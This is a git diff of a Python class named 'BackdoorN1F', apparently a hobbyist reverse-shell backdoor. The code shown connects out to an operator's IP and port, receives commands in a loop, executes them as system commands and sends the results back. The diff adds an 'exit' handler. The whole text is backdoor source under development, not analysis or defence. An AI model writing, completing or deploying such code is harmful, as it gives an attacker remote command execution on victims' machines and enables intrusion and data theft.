@@ -16,7 +16,6 @@ class BackdoorN1F:
         self.connectto = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connectto.connect((ip, port))
 
-
 #   #####################################################################################
 #   Need to make it work ...
     def reliable_send(self, data):
@@ -35,11 +34,12 @@ class BackdoorN1F:
     def run_backdoor(self):
         while True:
             command = self.reliable_recv()
+            if command[0] == "exit":
+                self.connectto.close()
+                exit()
             command_result = self.execute_sys_command(command)
             self.reliable_send(command_result.decode("utf-8"))
-        connectto.close()
 
 if __name__ == "__main__":
     b = BackdoorN1F(S_IP, S_PORT)
     b.run_backdoor()
-
